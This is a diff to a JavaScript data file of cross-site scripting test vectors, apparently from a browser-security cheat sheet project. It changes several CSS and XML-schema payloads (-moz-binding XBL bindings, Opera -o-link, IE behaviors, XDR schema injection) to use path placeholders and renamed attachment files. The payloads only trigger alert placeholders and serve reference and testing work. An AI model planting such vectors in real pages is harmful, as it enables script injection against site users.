@@ -1386,12 +1386,12 @@ var items =
             'ru' : 'Разрыв css-строки в Opera и Firefox',
             'de' : ''
         },
-        'data'       : '<div style="background:url(\'/foo/&#x0A);-moz-binding:url(moztest.xml#xss);-o-link-source:current;-o-link:&quot;%js_uri_alert%\\00\');">XXX',
+        'data'       : '<div style="background:url(\'/foo/&#x0A);-moz-binding:url(%xbl_path%#xss);-o-link-source:current;-o-link:&quot;%js_uri_alert%\\00\');">XXX',
         'attachment' : {
             'required_mime' : '',
             'samedomain'    : '1',            
-            'path'          : 'http://heideri.ch/jso/moztest.xml',
-            'name'          : 'moztest.xml',
+            'path'          : 'http://heideri.ch/jso/test.xbl',
+            'name'          : 'test.xbl',
             'raw'           : '<?xml version="1.0" ?><bindings xmlns="http://www.mozilla.org/xbl"><binding id="xss"><implementation><constructor><![CDATA[%js_alert%]]></constructor></implementation></binding></bindings>'
         },
         'description': {
@@ -1871,12 +1871,12 @@ var items =
             'ru' : 'Обфускация опасных css-свойств без кодирования и обратного слеша',
             'de' : ''
         },
-        'data'       : '<div style="	 \n/**/{-moz-binding/**/ 	\n:url(moztest.xml)"><div style="{/**/-o-link/**/:\'%js_uri_alert%\'"><div style={/**/-o-link-source/**/:current><div style=***:)(@~][\'foo:foo\'$%^&#*beha/**/vior/**/:url(#default#time2) style=***:)(@~][\'foo:foo\'$%^&#*beha/**/vior,foo)(@~][\'foo:foo\'$%^&#*:url(#default#time2) onend=%js_alert% end=0>XXX',
+        'data'       : '<div style="	 \n/**/{-moz-binding/**/ 	\n:url(%xbl_path%)"><div style="{/**/-o-link/**/:\'%js_uri_alert%\'"><div style={/**/-o-link-source/**/:current><div style=***:)(@~][\'foo:foo\'$%^&#*beha/**/vior/**/:url(#default#time2) style=***:)(@~][\'foo:foo\'$%^&#*beha/**/vior,foo)(@~][\'foo:foo\'$%^&#*:url(#default#time2) onend=%js_alert% end=0>XXX',
         'attachment' : {
             'required_mime' : '',
             'samedomain'    : '1',            
-            'path'          : 'http://heideri.ch/jso/moztest.xml',
-            'name'          : 'moztest.xml',
+            'path'          : 'http://heideri.ch/jso/test.xbl',
+            'name'          : 'test.xbl',
             'raw'           : '<?xml version="1.0" ?><bindings xmlns="http://www.mozilla.org/xbl"><binding id="xss"><implementation><constructor><![CDATA[%js_alert%]]></constructor></implementation></binding></bindings>'
         },
         'description': {
@@ -1909,12 +1909,12 @@ var items =
             'ru' : 'CSS-кодирование и добавление обратного слеша',
             'de' : ''
         },
-        'data'       : '<div style="\\000062\\00065\\68\\0\\00	\\000061 vior:url\\28#default#time2);\\-\\\n\\\n\\00006D\\0006f\\7A\\2d \\62	\\000069 \\06E ding:url(moztest.xml#xss);\\-\\00006F\\0002d\\6C\n\\69 \\6e	\\00006B:\'%js_uri_alert%\';\\-\\00006F\\0002d\\6C\n\\69 \\6e	\\00006B-source:current" end=0 onend=%js_alert%>XXX',
+        'data'       : '<div style="\\000062\\00065\\68\\0\\00	\\000061 vior:url\\28#default#time2);\\-\\\n\\\n\\00006D\\0006f\\7A\\2d \\62	\\000069 \\06E ding:url(%xbl_path%#xss);\\-\\00006F\\0002d\\6C\n\\69 \\6e	\\00006B:\'%js_uri_alert%\';\\-\\00006F\\0002d\\6C\n\\69 \\6e	\\00006B-source:current" end=0 onend=%js_alert%>XXX',
         'attachment' : {
             'required_mime' : '',
             'samedomain'    : '1',            
-            'path'          : 'http://heideri.ch/jso/moztest.xml',
-            'name'          : 'moztest.xml',
+            'path'          : 'http://heideri.ch/jso/test.xbl',
+            'name'          : 'test.xbl',
             'raw'           : '<?xml version="1.0" ?><bindings xmlns="http://www.mozilla.org/xbl"><binding id="xss"><implementation><constructor><![CDATA[%js_alert%]]></constructor></implementation></binding></bindings>'
         },
         'description': {
@@ -2446,12 +2446,12 @@ var items =
             'ru' : 'Инъекция удаленного javascript-кода в IE с помощью XSL и XDR-схемы',
             'de' : ''
         },
-        'data'       : '<?xml-stylesheet type="text/xsl" href="#"?><img xmlns="x-schema:xdrtest.xml"/>',
+        'data'       : '<?xml-stylesheet type="text/xsl" href="#"?><img xmlns="x-schema:%xdr_path%"/>',
         'attachment' : {
             'required_mime' : '',
             'samedomain'    : '0',            
-            'path'          : 'http://heideri.ch/jso/xdrtest.xml',
-            'name'          : 'xdrtest.xml',
+            'path'          : 'http://heideri.ch/jso/test.xdr',
+            'name'          : 'test.xdl',
             'raw'           : '<?xml version="1.0"?>\n<Schema name="x" xmlns="urn:schemas-microsoft-com:xml-data">\n<ElementType name="img">\n<AttributeType name="src" required="yes" default="x"/>\n<AttributeType name="onerror" required="yes" default="%js_alert%"/>\n<attribute type="src"/>\n<attribute type="onerror"/>\n</ElementType>\n</Schema>'
         },
         'description': {
